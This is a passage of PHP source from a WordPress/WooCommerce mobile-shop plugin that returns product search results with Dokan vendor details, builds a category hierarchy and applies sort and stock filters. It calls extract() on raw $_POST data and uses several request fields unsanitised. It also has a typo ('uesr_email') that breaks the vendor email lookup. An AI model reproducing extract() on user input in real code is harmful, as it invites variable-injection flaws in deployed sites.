        if ($s != '') {
            $index = $this->service_container->get(Index::class);
            wp_reset_query();
            $page = ( isset($_POST['page']) ) ? $_POST['page'] : 1;
            $count = ( osa_get_option('Archive_product_count') ) ? osa_get_option('Archive_product_count') : 8;
            $paged = ( get_query_var('paged') ) ? get_query_var('paged') : 0;
            $offset = ( $page - 1 ) * $count;
            $branchCatID = osa_get_option('appBranchCat');
            $args = array(
                's' => $s,
                'offset' => $offset,
                'post_type' => 'product',
                'paged' => $paged,
                'posts_per_page' => $count,
            );
            $general = $this->service_container->get(General::class);
            $activeVendors = $general->vendor_ids();
            if (strlen($_POST['vendor_town']) > 2) {
                $args['author__in'] = $activeVendors;
            }
            $userToken = $_POST['userToken'];
            $user_action = $this->service_container->get('OSA_user');
            $user_id = $user_action->get_userID_byToken($userToken);
            $this->user_id = $user_id;
            do_action('osa_archive_search_action_init',$s,$user_id);
            $this->shared_query_filters($args,$_POST);
            $data = array();
            $wp_query = new WP_Query();
            $wp_query->query(apply_filters("osa_search_search_query_args", $args, $this->user_id));
            if (function_exists("relevanssi_do_query")) {
                relevanssi_do_query($wp_query);
            }
            if ($wp_query->have_posts()):
                $data['status'] = true;
                if ($return) {
                    $data['keyword'] = $s;
                }
                while ($wp_query->have_posts()):
                    $wp_query->the_post();
                    $product_id = get_the_ID();
                    $product = wc_get_product($product_id);
                    global $post, $product;
                    if (has_post_thumbnail()) {
                        $img_id = get_post_thumbnail_id($product_id);
                        $thumb = wp_get_attachment_image_src($img_id, 'medium')[0];
                    } else {
                        $thumb = $img = OSA_PLUGIN_URL . "/assets/images/notp.png";
                    }
                    $product_id = get_the_ID();
                    $productInfo['id'] = $product_id;
                    $productInfo['title'] = html_entity_decode(get_the_title());
                    $enTitle = get_post_meta($product_id, '_subtitle', true);
                    $productInfo['EN_title'] = ( $enTitle ) ? $enTitle : get_post_meta($product_id, '_ENtitle', true);
                    $productInfo['thumbnail'] = $thumb;
                    //$productInfo['stock_quantity'] = ( $product->get_stock_quantity() ) ? intval( $product->get_stock_quantity() ) : 0;
                    //$productInfo['in_stock']       = $product->is_in_stock();
                    $productInfo['stock_status'] = $product->get_stock_status();
                    $productInfo['type'] = ( $product->get_type() == 'grouped' OR $product->get_type() == 'simple_catalogue' ) ? 'simple_catalogue' : $product->get_type();
                    $productInfo['qty'] = $general->Advanced_Qty($productInfo['id']);
                    $prices = $index->filter_prices($product);
                    $productInfo['regular_price'] = trim($prices['regular_price']);
                    $productInfo['sale_price'] = trim($prices['sale_price']);

                    if (function_exists("YITH_Role_Based_Type")) {
                        $productInfo['regular_price'] = $this->yith_price_role->get_compute_price_render($product, $this->user_id);
                        $productInfo['sale_price'] = "";
                    }

                    //$productInfo['sale_price_dates_to']   = $prices['sale_price_dates_to'];
                    //$productInfo['sale_price_dates_from'] = $prices['sale_price_dates_from'];

                    $productInfo['stock_quantity'] = ( $product->get_stock_quantity() ) ? intval($product->get_stock_quantity()) : 0;
                    //$instock                       = get_post_meta( $productInfo['id'], '_stock_status', true );
                    $productInfo['in_stock'] = $product->is_in_stock();
                    $productInfo['type'] = ( $product->get_type() == 'grouped' OR $product->get_type() == 'simple_catalogue' ) ? 'simple_catalogue' : $product->get_type();
                    $productInfo['currency'] = html_entity_decode(get_woocommerce_currency_symbol());
                    $vendor = array();
                    if (function_exists('dokan_get_store_info')) {
                        $author_id = get_post_field('post_author', $productInfo['id']);
                        $store_settings = dokan_get_store_info($author_id);
                        $store_settings['address']['street_1'] = ( $store_settings['address']['street_1'] ) ? $store_settings['address']['street_1'] : '';
                        $store_settings['address']['street_2'] = ( $store_settings['address']['street_2'] ) ? $store_settings['address']['street_2'] : '';
                        $store_settings['address']['country'] = ( $store_settings['address']['country'] ) ? $store_settings['address']['country'] : 'IR';
                        $store_settings['address']['zip'] = ( $store_settings['address']['zip'] ) ? $store_settings['address']['zip'] : '';
                        $store_settings['address']['city'] = ( $store_settings['address']['city'] ) ? $store_settings['address']['city'] : '';
                        $user = get_userdata($author_id);
                        $email = $user->uesr_email;
                        $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
                        $banner = ( $banner ) ? $banner : '';
                        $gravatar = get_avatar_url($email);

                        $vendor = array(
                            'vendor_id' => intval($author_id),
                            'store_name' => $store_settings['store_name'],
                            'phone' => $store_settings['phone'],
                            'address' => $store_settings['address'],
                            'email' => ( $email ) ? $email : '',
                            'banner' => ( $banner ) ? $banner : '',
                            'gravatar' => ( $gravatar ) ? $gravatar : '',
                        );
                    }
                    $productInfo['vendor'] = $vendor;
                    $data['data'][] = apply_filters("osa_search_search_product_item_info", $productInfo, $product_id, $this->user_id);
                endwhile;

            else:
                $data = array(
                    'status' => false,
                    'error' => array(
                        'errorCode' => - 12,
                        'message' => __('Result not found.', 'onlinerShopApp')
                    )
                );
                if ($return) {
                    $data['keyword'] = $s;
                }
            endif;
            $data['filter_fields'] = apply_filters( "osa_archive_filter_fields_validation", true )? $this->get_filter_fields(- 1, $s, - 1) : array();
            $result = $data;
        } else {

            $result = array(
                'status' => false,
                'error' => array(
                    'errorCode' => - 12,
                    'message' => __('don\'t receive keyword for search.', 'onlinerShopApp')
                )
            );
            if ($return) {
                $result['keyword'] = $s;
            }
        }
        return apply_filters('osa_archive_search_result',$result,$activeVendors);
    }

    public function categoryHierarchy(){
        $parent_ids = osa_get_option('appProCats');
		$taxonomy_args = ['taxonomy' => 'product_cat' , 'hide_empty' => false];
		if(0 != $parent_ids && count($parent_ids) > 0){
			$taxonomy_args['include'] = $parent_ids;
			$taxonomy_args['number'] = count($parent_ids);
		}else{
			$taxonomy_args['parent'] = 0;	
		}
		$parent_terms = get_terms($taxonomy_args);
        if(empty($parent_terms)){
            return [
                'status' => false,
                'message' => __("no product category was founded","onlinerShopApp")
            ];
        }
        foreach($parent_terms as $parent_term){
            $childrens = [];
            $child_terms = get_terms(['parent' => $parent_term->term_id,'taxonomy' => 'product_cat','hide_empty' => false]);
            $parent = [
                'id' => $parent_term->term_id,
                'title' => $parent_term->name
            ];
			if(!empty($child_terms)){
				foreach($child_terms as $child_term){
					$thumbnail_id = get_term_meta($child_term->term_id,'thumbnail_id',true);
					$thumbnail_url = wp_get_attachment_url($thumbnail_id) ?: trailingslashit( OSA_PLUGIN_URL ) . "assets/images/notp.png";
					$childrens[] = [
						'id' => $child_term->term_id,
						'name' => $child_term->name,
						'thumbnail' => $thumbnail_url,
						'count' => $child_term->count
					];

				}
			}
            $data[] = [
                'parent' => $parent,
                'childrens' => $childrens ?? []
            ];
        }
        return [
            'status' => true,
            'data' => $data
        ];
        
    }

    public function shared_query_filters(&$args,$methods){
        extract($methods);
        switch ($sort) {
            case 'date':
                $args['orderby'] = $sort;
                $args['order'] = 'DESC';
                break;
            case 'rand':
                $args['orderby'] = $sort;
                break;
            case 'sale':
                $args['orderby'] = 'meta_value_num';
                $args['meta_key'] = 'total_sales';
                $args['order'] = 'DESC';
                break;
            case 'view':
                $viewCounterField = ( osa_get_option('viewCounterField') ) ? osa_get_option('viewCounterField') : 'post-views';
                if ($viewCounterField) {
                    $args['orderby'] = 'meta_value_num';
                    $args['meta_key'] = $viewCounterField;
                    $args['order'] = 'DESC';
                }
                break;
            case 'Expensive':
                $args['orderby'] = 'meta_value_num';
                $args['meta_key'] = '_price';
                $args['order'] = 'DESC';
                break;
            case 'Inexpensive':
                $args['orderby'] = 'meta_value_num';
                $args['meta_key'] = '_price';
                $args['order'] = 'ASC';
                break;
            case 'featured':
                $args['meta_key'] = '_featured';
                $args['meta_value'] = 'yes';
                break;
        }
        if ($exist == 'true') {
            $args['meta_query'] = array(
                array(// Simple products type
                    'key' => '_stock_status',
                    'value' => 'instock',
                    'compare' => '=',
                )
            );
        }
    }

}
